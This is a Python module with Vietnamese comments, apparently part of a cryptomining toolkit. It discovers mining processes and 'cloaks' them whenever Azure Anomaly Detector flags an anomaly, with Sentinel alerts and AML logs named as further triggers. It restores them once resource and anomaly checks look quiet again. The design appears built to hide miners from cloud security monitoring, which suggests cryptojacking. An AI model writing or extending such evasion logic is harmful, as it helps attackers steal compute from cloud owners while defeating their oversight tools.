# anomaly_detector.py

import psutil
import logging
import traceback
import pynvml
import asyncio
from asyncio import Event
from typing import List, Dict, Any, Optional, Tuple
from threading import Lock
from .base_manager import BaseManager
from .utils import MiningProcess, GPUManager
from .auxiliary_modules.power_management import get_cpu_power, get_gpu_power
from .auxiliary_modules.temperature_monitor import get_cpu_temperature, get_gpu_temperature

# Import Interface
from .interfaces import IResourceManager

###############################################################################
#                  LỚP ĐÁNH GIÁ RESTORE: SafeRestoreEvaluator                 #
###############################################################################

class SafeRestoreEvaluator:
    """
    Lớp đánh giá điều kiện an toàn để khôi phục tài nguyên cho tiến trình.
    *Giữ nguyên logic cũ, chỉ bỏ polling - thay vào khi AnomalyDetector
     xác định tiến trình đang bị cloaked, sẽ gọi hàm này để kiểm tra
     xem có đủ an toàn để restore chưa.*
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger, resource_manager: IResourceManager):
        self.config = config
        self.logger = logger
        self.resource_manager = resource_manager

        # Ngưỡng baseline
        baseline_thresholds = self.config.get('baseline_thresholds', {})
        self.baseline_cpu_usage_percent = baseline_thresholds.get('cpu_usage_percent', 80)
        self.baseline_gpu_usage_percent = baseline_thresholds.get('gpu_usage_percent', 80)
        self.baseline_ram_usage_percent = baseline_thresholds.get('ram_usage_percent', 80)
        self.baseline_disk_io_usage_mbps = baseline_thresholds.get('disk_io_usage_mbps', 80)
        self.baseline_network_usage_mbps = baseline_thresholds.get('network_usage_mbps', 80)

        # Giới hạn nhiệt độ
        temperature_limits = self.config.get("temperature_limits", {})
        self.cpu_max_temp = temperature_limits.get("cpu_max_celsius", 75)
        self.gpu_max_temp = temperature_limits.get("gpu_max_celsius", 75)

        # Giới hạn công suất
        power_limits = self.config.get("power_limits", {})
        per_device_power = power_limits.get("per_device_power_watts", {})
        self.cpu_max_power = per_device_power.get("cpu", 100)
        self.gpu_max_power = per_device_power.get("gpu", 200)

    async def is_safe_to_restore(self, process: MiningProcess) -> bool:
        """
        Kiểm tra điều kiện an toàn để khôi phục tài nguyên.
        Thay vì polling trong vòng lặp, ta chỉ gọi hàm này khi AnomalyDetector
        xác định rằng chúng ta nên thử restore tiến trình bị cloaked.
        """
        # 1) Kiểm tra sự tồn tại
        if not psutil.pid_exists(process.pid):
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại.")
            return False

        # 2) Kiểm tra nhiệt độ CPU
        try:
            cpu_temp = await asyncio.get_event_loop().run_in_executor(None, get_cpu_temperature, process.pid)
            if cpu_temp is not None and cpu_temp >= self.cpu_max_temp:
                self.logger.info(f"Nhiệt độ CPU {cpu_temp}°C vẫn cao (PID={process.pid}).")
                return False
        except Exception as e:
            self.logger.error(f"Lỗi khi kiểm tra nhiệt độ CPU PID={process.pid}: {e}\n{traceback.format_exc()}")
            return False

        # 3) Kiểm tra nhiệt độ GPU
        try:
            if self.resource_manager.is_gpu_initialized():
                gpu_temps = await asyncio.get_event_loop().run_in_executor(None, get_gpu_temperature, process.pid)
                if gpu_temps and any(temp >= self.gpu_max_temp for temp in gpu_temps):
                    self.logger.info(f"Nhiệt độ GPU {gpu_temps}°C vẫn cao (PID={process.pid}).")
                    return False
        except Exception as e:
            self.logger.error(f"Lỗi khi kiểm tra nhiệt độ GPU PID={process.pid}: {e}\n{traceback.format_exc()}")
            return False

        # 4) Kiểm tra công suất CPU
        try:
            cpu_power = await asyncio.get_event_loop().run_in_executor(None, get_cpu_power, process.pid)
            if cpu_power is not None and cpu_power >= self.cpu_max_power:
                self.logger.info(f"Công suất CPU {cpu_power}W vẫn cao (PID={process.pid}).")
                return False
        except Exception as e:
            self.logger.error(f"Lỗi kiểm tra công suất CPU PID={process.pid}: {e}\n{traceback.format_exc()}")
            return False

        # 5) Kiểm tra công suất GPU
        try:
            if self.resource_manager.is_gpu_initialized():
                gpu_power = await asyncio.get_event_loop().run_in_executor(None, get_gpu_power, process.pid)
                # Nếu gpu_power là list => check tổng
                if isinstance(gpu_power, list):
                    if sum(gpu_power) >= self.gpu_max_power:
                        self.logger.info(f"Công suất GPU {gpu_power}W vẫn cao (PID={process.pid}).")
                        return False
                else:
                    if gpu_power >= self.gpu_max_power:
                        self.logger.info(f"Công suất GPU {gpu_power}W vẫn cao (PID={process.pid}).")
                        return False
        except Exception as e:
            self.logger.error(f"Lỗi kiểm tra công suất GPU PID={process.pid}: {e}\n{traceback.format_exc()}")
            return False

        # 6) Kiểm tra CPU usage tổng thể
        try:
            total_cpu_usage = psutil.cpu_percent(interval=1)
            if total_cpu_usage >= self.baseline_cpu_usage_percent:
                self.logger.info(f"Sử dụng CPU tổng thể {total_cpu_usage}% vẫn cao.")
                return False
        except Exception as e:
            self.logger.error(f"Lỗi khi kiểm tra CPU tổng thể: {e}\n{traceback.format_exc()}")
            return False

        # 7) Kiểm tra RAM
        try:
            ram = psutil.virtual_memory()
            if ram.percent >= self.baseline_ram_usage_percent:
                self.logger.info(f"Sử dụng RAM tổng thể {ram.percent}% vẫn cao.")
                return False
        except Exception as e:
            self.logger.error(f"Lỗi khi kiểm tra RAM tổng thể: {e}\n{traceback.format_exc()}")
            return False

        # 8) Kiểm tra Disk I/O
        try:
            disk_io_counters = psutil.disk_io_counters()
            total_disk_io_usage_mbps = (disk_io_counters.read_bytes + disk_io_counters.write_bytes) / (1024 * 1024)
            if total_disk_io_usage_mbps >= self.baseline_disk_io_usage_mbps:
                self.logger.info(f"Sử dụng Disk I/O {total_disk_io_usage_mbps:.2f} MBps vẫn cao.")
                return False
        except Exception as e:
            self.logger.error(f"Lỗi kiểm tra Disk I/O: {e}\n{traceback.format_exc()}")
            return False

        # 9) Kiểm tra mạng
        try:
            net_io_counters = psutil.net_io_counters()
            total_network_usage_mbps = (
                (net_io_counters.bytes_sent + net_io_counters.bytes_recv)
                / (1024 * 1024)
            )
            if total_network_usage_mbps >= self.baseline_network_usage_mbps:
                self.logger.info(f"Sử dụng mạng {total_network_usage_mbps:.2f} MBps vẫn cao.")
                return False
        except Exception as e:
            self.logger.error(f"Lỗi kiểm tra mạng: {e}\n{traceback.format_exc()}")
            return False

        # 10) Kiểm tra bất thường qua Azure AnomalyDetector
        try:
            current_state = await self.resource_manager.collect_metrics(process)
            anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
            if anomalies_detected:
                self.logger.info(f"Azure Anomaly Detector phát hiện bất thường (PID={process.pid}).")
                return False
        except Exception as e:
            self.logger.error(f"Lỗi qua Azure Anomaly Detector PID={process.pid}: {e}\n{traceback.format_exc()}")
            return False

        # Nếu tất cả điều kiện OK => trả về True
        self.logger.info(f"Đủ điều kiện an toàn để khôi phục tài nguyên cho PID={process.pid}.")
        return True


###############################################################################
#                   LỚP CHÍNH: AnomalyDetector (SINGLETON)                    #
###############################################################################


class AnomalyDetector(BaseManager):
    """
    Lớp phát hiện bất thường cho các tiến trình khai thác.
    Sử dụng kiểu event-driven:
      - Thay vì polling liên tục, ta chỉ chạy các coroutine theo lịch
        hoặc gọi khi ResourceManager push event.
      - Ở đây vẫn giữ 2 coroutine chính:
          + anomaly_detection() phát hiện bất thường
          + monitor_restoration() kiểm tra xem khi nào có thể restore
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(AnomalyDetector, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        BaseManager.__init__(self, config, logger)
        if hasattr(self, '_initialized') and self._initialized:
            return
        self._initialized = True

        self.logger = logger
        self.config = config

        # Sự kiện dừng
        self.stop_event = Event()

        self.mining_processes: List[MiningProcess] = []
        self.mining_processes_lock = asyncio.Lock()

        self.gpu_manager = GPUManager()
        self.gpu_initialized = self.gpu_manager.gpu_initialized
        if self.gpu_initialized:
            self.logger.info("GPUManager đã được khởi tạo thành công.")
        else:
            self.logger.warning("GPUManager không được khởi tạo - vô hiệu hoá tính năng GPU.")

        self.resource_manager: Optional[IResourceManager] = None
        self.safe_restore_evaluator: Optional[SafeRestoreEvaluator] = None

        # Chứa các task chạy ngầm
        self.task_futures = []

    def set_resource_manager(self, resource_manager: IResourceManager):
        """
        Thiết lập ResourceManager cho AnomalyDetector.
        Tạo SafeRestoreEvaluator và khởi chạy các coroutine chính.
        """
        self.resource_manager = resource_manager
        self.logger.info("ResourceManager đã được gán cho AnomalyDetector.")

        self.safe_restore_evaluator = SafeRestoreEvaluator(
            self.config,
            self.logger,
            self.resource_manager
        )

        loop = asyncio.get_event_loop()
        self.task_futures.append(loop.create_task(self.anomaly_detection()))
        self.task_futures.append(loop.create_task(self.monitor_restoration()))

    async def start(self):
        """
        Khởi động AnomalyDetector. 
        Chỉ đơn giản gọi discover_mining_processes_async() ban đầu.
        """
        self.logger.info("Đang khởi động AnomalyDetector...")
        await self.discover_mining_processes_async()
        self.logger.info("AnomalyDetector khởi động thành công.")

    async def discover_mining_processes_async(self):
        """
        Tương tự ResourceManager, tìm các tiến trình khai thác dựa trên config.
        """
        cpu_process_name = self.config['processes'].get('CPU', '').lower()
        gpu_process_name = self.config['processes'].get('GPU', '').lower()

        async with self.mining_processes_lock:
            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if cpu_process_name in proc_name or gpu_process_name in proc_name:
                        priority = self.get_process_priority(proc.info['name'])
                        network_interface = self.config.get('network_interface', 'eth0')
                        mining_proc = MiningProcess(
                            proc.info['pid'],
                            proc.info['name'],
                            priority,
                            network_interface,
                            self.logger
                        )
                        mining_proc.is_cloaked = False
                        self.mining_processes.append(mining_proc)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue

            self.logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy độ ưu tiên dựa trên config (giữ nguyên logic).
        """
        priority_map = self.config.get('process_priority_map', {})
        priority = priority_map.get(process_name.lower(), 1)
        if not isinstance(priority, int):
            self.logger.warning(
                f"Độ ưu tiên cho tiến trình '{process_name}' không phải int => gán = 1."
            )
            priority = 1
        return priority

    ##########################################################################
    #                    PHÁT HIỆN BẤT THƯỜNG & ENQUEUE CLOAKING             #
    ##########################################################################

    async def anomaly_detection(self):
        """
        Coroutine chính để phát hiện bất thường.
        Thay vì vòng lặp lớn, ta có thể thiết lập interval cho dễ (vẫn là async),
        hoặc gắn vào 1 cơ chế schedule event. Ở đây ta vẫn dùng interval tối thiểu
        để tránh spam.
        """
        detection_interval = self.config.get("monitoring_parameters", {}).get("detection_interval_seconds", 3600)
        cloak_delay = self.config.get("monitoring_parameters", {}).get("cloak_activation_delay_seconds", 5)

        while not self.stop_event.is_set():
            try:
                # Update danh sách tiến trình
                await self.discover_mining_processes_async()

                if not self.resource_manager:
                    self.logger.error("ResourceManager chưa được thiết lập - không thể detect anomalies.")
                else:
                    # Sao chép danh sách cục bộ
                    async with self.mining_processes_lock:
                        processes = list(self.mining_processes)

                    tasks = []
                    for process in processes:
                        tasks.append(self.evaluate_process_anomaly(process, cloak_delay))
                    await asyncio.gather(*tasks)

            except Exception as e:
                self.logger.error(f"Lỗi trong anomaly_detection: {e}\n{traceback.format_exc()}")

            # Nghỉ cho đến lần kiểm tra tiếp theo
            await asyncio.sleep(detection_interval)

    async def evaluate_process_anomaly(self, process: MiningProcess, cloak_activation_delay: int):
        """
        Đánh giá 1 tiến trình, nếu phát hiện bất thường => enqueue cloaking.
        """
        try:
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại.")
                return

            if not self.resource_manager:
                return

            # 1) Phát hiện bất thường qua Azure Anomaly Detector
            current_state = await self.resource_manager.collect_metrics(process)
            anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
            if anomalies_detected:
                self.logger.warning(
                    f"Phát hiện bất thường trong {process.name} (PID={process.pid}). Cloak sau {cloak_activation_delay} giây."
                )
                await asyncio.sleep(cloak_activation_delay)
                await self.enqueue_cloaking(process)
                process.is_cloaked = True

            # 2) Kiểm tra Sentinel Alerts (nếu cần), logic cũ đã comment
            # 3) Kiểm tra AML logs (nếu cần), logic cũ đã comment

        except Exception as e:
            self.logger.error(f"Lỗi evaluate_process_anomaly PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def enqueue_cloaking(self, process: MiningProcess):
        """
        Thêm tiến trình vào queue ResourceManager để cloak.
        """
        try:
            await self.resource_manager.enqueue_cloaking(process)
            self.logger.info(f"Đã enqueue cloaking cho {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue cloaking PID={process.pid}: {e}\n{traceback.format_exc()}")

    async def enqueue_restoration(self, process: MiningProcess):
        """
        Thêm tiến trình vào queue ResourceManager để restore.
        """
        try:
            await self.resource_manager.enqueue_restoration(process)
            self.logger.info(f"Đã enqueue khôi phục cho {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue restore PID={process.pid}: {e}\n{traceback.format_exc()}")

    ##########################################################################
    #                 GIÁM SÁT ĐIỀU KIỆN VÀ KHÔI PHỤC TÀI NGUYÊN            #
    ##########################################################################
    
    async def monitor_restoration(self):
        """
        Coroutine để xử lý phục hồi tài nguyên cho các tiến trình đã cloaked.
        Thay vì polling liên tục, ta vẫn đặt interval cho gọn.
        """
        interval = 60  # mỗi 60 giây kiểm tra 1 lần
        while not self.stop_event.is_set():
            try:
                async with self.mining_processes_lock:
                    cloaked_processes = [proc for proc in self.mining_processes if getattr(proc, 'is_cloaked', False)]

                if self.safe_restore_evaluator and cloaked_processes:
                    tasks = []
                    for process in cloaked_processes:
                        tasks.append(self.safe_restore_evaluator.is_safe_to_restore(process))
                    results = await asyncio.gather(*tasks)

                    for process, is_safe in zip(cloaked_processes, results):
                        if is_safe:
                            self.logger.info(f"Đủ điều kiện khôi phục cho PID={process.pid}.")
                            await self.enqueue_restoration(process)
                            process.is_cloaked = False
                            self.logger.info(f"Đã khôi phục tài nguyên cho {process.name} (PID={process.pid}).")

            except Exception as e:
                self.logger.error(f"Lỗi trong monitor_restoration: {e}\n{traceback.format_exc()}")

            await asyncio.sleep(interval)

    async def stop(self):
        """
        Dừng AnomalyDetector: huỷ các task ngầm.
        """
        self.logger.info("Đang dừng AnomalyDetector...")
        self.stop_event.set()
        for t in self.task_futures:
            t.cancel()
        await asyncio.gather(*self.task_futures, return_exceptions=True)
        self.logger.info("AnomalyDetector đã dừng thành công.")
